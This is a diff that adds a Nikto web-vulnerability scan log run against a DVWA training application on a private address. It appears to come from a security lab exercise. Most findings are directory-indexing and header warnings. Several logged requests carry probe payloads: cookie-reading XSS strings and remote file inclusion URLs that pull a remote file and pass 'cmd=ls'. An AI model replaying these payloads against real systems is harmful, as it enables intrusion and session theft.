@@ -1,0 +1,38 @@
+- Nikto v2.1.5/2.1.5
++ Target Host: 10.145.23.140
++ Target Port: 80
++ GET /dvwa/dvwa/: The anti-clickjacking X-Frame-Options header is not present.
++ -3268: GET /dvwa/dvwa/: /dvwa/: Directory indexing found.
++ -5737: GET /dvwa.: WebLogic may reveal its internal IP or hostname in the Location header. The value is "http://localhost/dvwa./".
++ OPTIONS /dvwa/: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE 
++ -877: TRACE /dvwa/: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ -3268: GET /dvwa/dvwa/./: /dvwa/./: Directory indexing found.
++ -3268: GET /dvwa/dvwa/?mod=node&nid=some_thing&op=view: /dvwa/?mod=node&nid=some_thing&op=view: Directory indexing found.
++ -3268: GET /dvwa/dvwa/?mod=some_thing&op=browse: /dvwa/?mod=some_thing&op=browse: Directory indexing found.
++ GET /dvwa/dvwa/./: /dvwa/./: Appending '/./' to a directory allows indexing
++ -3268: GET /dvwa/dvwa//: /dvwa//: Directory indexing found.
++ GET /dvwa/dvwa//: /dvwa//: Apache on Red Hat Linux release 9 reveals the root directory listing by default if there is no index page.
++ -3268: GET /dvwa/dvwa/?Open: /dvwa/?Open: Directory indexing found.
++ -3268: GET /dvwa/dvwa/?OpenServer: /dvwa/?OpenServer: Directory indexing found.
++ -3268: GET /dvwa/dvwa/%2e/: /dvwa/%2e/: Directory indexing found.
++ -576: GET /dvwa/dvwa/%2e/: /dvwa/%2e/: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. BID-2513.
++ -3268: GET /dvwa/dvwa/?mod=<script>alert(document.cookie)</script>&op=browse: /dvwa/?mod=<script>alert(document.cookie)</script>&op=browse: Directory indexing found.
++ -3268: GET /dvwa/dvwa/?sql_debug=1: /dvwa/?sql_debug=1: Directory indexing found.
++ -3268: GET /dvwa/dvwa///: /dvwa///: Directory indexing found.
++ -3268: GET /dvwa/dvwa/?PageServices: /dvwa/?PageServices: Directory indexing found.
++ -119: GET /dvwa/dvwa/?PageServices: /dvwa/?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. CVE-1999-0269.
++ -3268: GET /dvwa/dvwa/?wp-cs-dump: /dvwa/?wp-cs-dump: Directory indexing found.
++ -119: GET /dvwa/dvwa/?wp-cs-dump: /dvwa/?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. CVE-1999-0269.
++ -3268: GET /dvwa/dvwa///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: /dvwa///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.
++ -3288: GET /dvwa/dvwa///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: /dvwa///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when 	 /'s are requested.
++ -3268: GET /dvwa/dvwa/?pattern=/etc/*&sort=name: /dvwa/?pattern=/etc/*&sort=name: Directory indexing found.
++ -3268: GET /dvwa/dvwa/?D=A: /dvwa/?D=A: Directory indexing found.
++ -3268: GET /dvwa/dvwa/?N=D: /dvwa/?N=D: Directory indexing found.
++ -3268: GET /dvwa/dvwa/?S=A: /dvwa/?S=A: Directory indexing found.
++ -3268: GET /dvwa/dvwa/?M=A: /dvwa/?M=A: Directory indexing found.
++ -3268: GET /dvwa/dvwa/?\"><script>alert('Vulnerable');</script>: /dvwa/?\"><script>alert('Vulnerable');</script>: Directory indexing found.
++ -3268: GET /dvwa/dvwa/?_CONFIG[files][functions_page]=http://cirt.net/rfiinc.txt?: /dvwa/?_CONFIG[files][functions_page]=http://cirt.net/rfiinc.txt?: Directory indexing found.
++ -3268: GET /dvwa/dvwa/?npage=-1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls: /dvwa/?npage=-1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls: Directory indexing found.
++ -3268: GET /dvwa/dvwa/?npage=1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls: /dvwa/?npage=1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls: Directory indexing found.
++ -3268: GET /dvwa/dvwa/?show=http://cirt.net/rfiinc.txt??: /dvwa/?show=http://cirt.net/rfiinc.txt??: Directory indexing found.
++ -3268: GET /dvwa/dvwa/?-s: /dvwa/?-s: Directory indexing found.
